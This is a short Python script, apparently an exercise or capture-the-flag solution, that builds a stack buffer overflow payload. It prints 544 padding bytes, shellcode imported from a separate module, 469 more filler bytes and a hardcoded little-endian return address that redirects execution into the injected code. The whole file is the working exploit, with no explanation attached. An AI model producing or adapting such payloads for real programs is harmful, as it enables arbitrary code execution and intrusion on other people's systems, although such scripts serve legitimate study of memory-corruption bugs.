from shellcode import shellcode
from struct import pack

print("A" * 544 + shellcode + "0" * 469 + pack("<I", 0xbffe9490))
